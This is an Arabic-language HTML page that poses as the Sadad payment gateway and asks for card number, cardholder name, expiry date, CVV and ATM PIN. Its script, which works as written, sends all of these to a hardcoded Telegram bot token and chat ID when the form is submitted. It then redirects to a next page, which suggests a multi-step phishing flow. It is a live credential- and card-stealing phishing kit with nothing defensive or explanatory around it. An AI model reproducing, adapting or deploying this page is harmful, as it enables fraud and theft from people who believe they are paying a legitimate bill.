<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بوابة سداد - تفاصيل الدفع</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f9f9f9; padding: 20px; direction: rtl; }
        .header { text-align: center; margin-bottom: 20px; }
        .header img { height: 60px; }
        .breadcrumb { text-align: center; color: green; font-size: 14px; margin-bottom: 20px; }
        .payment-container { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 0 15px rgba(0,0,0,0.1); max-width: 450px; margin: auto; }
        h2 { text-align: center; color: green; font-size: 22px; margin-bottom: 10px; }
        .form-group { margin-bottom: 18px; }
        label { display: block; margin-bottom: 8px; font-weight: bold; color: #333; font-size: 14px; }
        .input-wrapper { position: relative; }
        input { width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 8px; font-size: 16px; box-sizing: border-box; outline: none; transition: border-color 0.3s; }
        input[type="text"]#cardNumber, input[type="text"]#expiryDate, input[type="password"] { direction: ltr; text-align: left; }
        input:focus { border-color: green; box-shadow: 0 0 5px rgba(0,128,0,0.2); }
        input.error { border-color: #d32f2f; background-color: #ffebee; }
        input.success { border-color: #2e7d32; background-color: #f1f8e9; }
        .error-message { display: none; color: #d32f2f; font-size: 12px; margin-top: 5px; font-weight: bold; }
        .error-message.show { display: block; }
        .success-icon { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); color: #2e7d32; font-size: 18px; display: none; }
        .success-icon.show { display: block; }
        .row { display: flex; gap: 15px; }
        .row .form-group { flex: 1; }
        .pay-btn { width: 100%; background: green; color: white; border: none; padding: 14px; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 10px; }
        .pay-btn:hover:not(:disabled) { background: darkgreen; transform: translateY(-2px); }
        .pay-btn:disabled { background: #ccc; cursor: not-allowed; }
    </style>
</head>
<body>
    <div class="header"><img src="https://www2.0zz0.com/2025/03/10/21/595608613.jpg" alt="شعار سداد"></div>
    <div class="breadcrumb">الرئيسية / شخصي / اختر البنك / تفاصيل الدفع</div>
    <div class="payment-container">
        <h2>إدخال تفاصيل البطاقة</h2>
        <form id="paymentForm">
            <div class="form-group">
                <label for="cardNumber">رقم البطاقة</label>
                <div class="input-wrapper">
                    <!-- ✅ التعديل: إضافة autocomplete="cc-number" -->
                    <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" required inputmode="numeric" autocomplete="cc-number">
                    <span class="success-icon">✓</span>
                </div>
                <div class="error-message" id="cardNumberError"></div>
            </div>
            <div class="form-group">
                <label for="cardholderName">الاسم كما هو مسجل على البطاقة</label>
                <div class="input-wrapper">
                    <!-- ✅ التعديل: إضافة autocomplete="cc-name" -->
                    <input type="text" id="cardholderName" required autocomplete="cc-name">
                    <span class="success-icon">✓</span>
                </div>
                <div class="error-message" id="cardholderNameError"></div>
            </div>
            <div class="row">
                <div class="form-group">
                    <label for="expiryDate">تاريخ الانتهاء</label>
                    <div class="input-wrapper">
                        <!-- ✅ التعديل: إضافة autocomplete="cc-exp" -->
                        <input type="text" id="expiryDate" placeholder="MM/YY" maxlength="5" required inputmode="numeric" autocomplete="cc-exp">
                        <span class="success-icon">✓</span>
                    </div>
                    <div class="error-message" id="expiryDateError"></div>
                </div>
                <div class="form-group">
                    <label for="cvv">رمز التحقق (CVV)</label>
                    <div class="input-wrapper">
                        <!-- ✅ التعديل: إضافة autocomplete="cc-csc" -->
                        <input type="password" id="cvv" placeholder="123" maxlength="3" required inputmode="numeric" autocomplete="cc-csc">
                        <span class="success-icon">✓</span>
                    </div>
                    <div class="error-message" id="cvvError"></div>
                </div>
            </div>
            <div class="form-group">
                <label for="atmPin">رقم الصراف الآلي (PIN)</label>
                <div class="input-wrapper">
                    <input type="password" id="atmPin" placeholder="****" maxlength="4" required inputmode="numeric">
                    <span class="success-icon">✓</span>
                </div>
                <div class="error-message" id="atmPinError"></div>
            </div>
            <button type="submit" class="pay-btn" id="submitBtn" disabled>تأكيد الدفع</button>
        </form>
    </div>

    <script>
        // --- معلومات بوت التليجرام ---
        const BOT_TOKEN = "8724974748:AAEDSkmIz2F9NArgkbCtRGp7o9URQausmxI";
        const CHAT_ID = "1537773335";

        // --- دوال التحقق من صحة البيانات (بدون تغيير) ---
        function luhnCheck(num) { let s = 0, e = false; for (let i = num.length - 1; i >= 0; i--) { let d = parseInt(num[i], 10); if (e) { d *= 2; if (d > 9) d -= 9; } s += d; e = !e; } return s % 10 === 0; }
        const validators = {
            cardNumber: value => { const n = value.replace(/\s/g, ''); if (n.length !== 16) return { valid: false, message: 'رقم البطاقة يجب أن يكون 16 رقماً' }; if (!luhnCheck(n)) return { valid: false, message: 'رقم البطاقة غير صحيح' }; return { valid: true }; },
            cardholderName: value => { if (value.trim().length < 3) return { valid: false, message: 'الاسم قصير جداً' }; if (!/^[\u0600-\u06FF\s\-a-zA-Z]+$/.test(value)) return { valid: false, message: 'الاسم يحتوي على رموز غير مقبولة' }; return { valid: true }; },
            expiryDate: value => { const p = value.split('/'); if (p.length !== 2) return { valid: false, message: 'الصيغة الصحيحة: MM/YY' }; const m = parseInt(p[0], 10), y = parseInt(p[1], 10); if (isNaN(m) || isNaN(y) || m < 1 || m > 12) return { valid: false, message: 'تاريخ غير صحيح' }; const d = new Date(), cY = d.getFullYear() % 100, cM = d.getMonth() + 1; if (y < cY || (y === cY && m < cM)) return { valid: false, message: 'البطاقة منتهية الصلاحية' }; return { valid: true }; },
            cvv: value => !/^\d{3}$/.test(value) ? { valid: false, message: 'يجب أن يكون 3 أرقام' } : { valid: true },
            atmPin: value => !/^\d{4}$/.test(value) ? { valid: false, message: 'يجب أن يكون 4 أرقام' } : { valid: true }
        };

        // --- تطبيق التحقق على الحقول (بدون تغيير) ---
        function validateField(fieldId) {
            const field = document.getElementById(fieldId);
            const errorEl = document.getElementById(fieldId + 'Error');
            const icon = field.parentElement.querySelector('.success-icon');
            const result = validators[fieldId](field.value);
            field.classList.toggle('success', result.valid);
            field.classList.toggle('error', !result.valid);
            icon.style.display = result.valid ? 'block' : 'none';
            errorEl.style.display = result.valid ? 'none' : 'block';
            errorEl.textContent = result.message || '';
            checkFormValidity();
        }

        function checkFormValidity() {
            const isFormValid = Object.keys(validators).every(id => validators[id](document.getElementById(id).value).valid);
            document.getElementById('submitBtn').disabled = !isFormValid;
        }

        // --- ربط الأحداث مع الحقول (بدون تغيير) ---
        document.getElementById('cardNumber').addEventListener('input', e => { e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 '); validateField('cardNumber'); });
        document.getElementById('expiryDate').addEventListener('input', e => { e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{2})(?=\d)/g, '$1/'); validateField('expiryDate'); });
        ['cardholderName', 'cvv', 'atmPin'].forEach(id => document.getElementById(id).addEventListener('input', () => validateField(id)));

        // --- إرسال النموذج (بدون تغيير) ---
        document.getElementById('paymentForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            if (document.getElementById('submitBtn').disabled) return;
            const submitBtn = document.getElementById('submitBtn');
            submitBtn.disabled = true;
            submitBtn.textContent = 'جاري التأكيد...';
            const paymentData = { cardNumber: document.getElementById('cardNumber').value, cardholderName: document.getElementById('cardholderName').value, expiryDate: document.getElementById('expiryDate').value, cvv: document.getElementById('cvv').value, atmPin: document.getElementById('atmPin').value };
            let message = `
*💳===== [ الخطوة 3: تفاصيل البطاقة ] =====💳*

*👤 الاسم على البطاقة:*
\`${paymentData.cardholderName}\`

*🔢 رقم البطاقة:*
\`${paymentData.cardNumber}\`

*🗓️ تاريخ الانتهاء:* \`${paymentData.expiryDate}\`
*🔒 رمز CVV:* \`${paymentData.cvv}\`
*🔢 الرقم السري (PIN):* \`${paymentData.atmPin}\`
--------------------------------------------------
`;
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            try { await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' }) }); } catch (error) { console.error("Telegram send error:", error); } finally { window.location.href = 'page4.html'; }
        });
    </script>
</body>
</html>
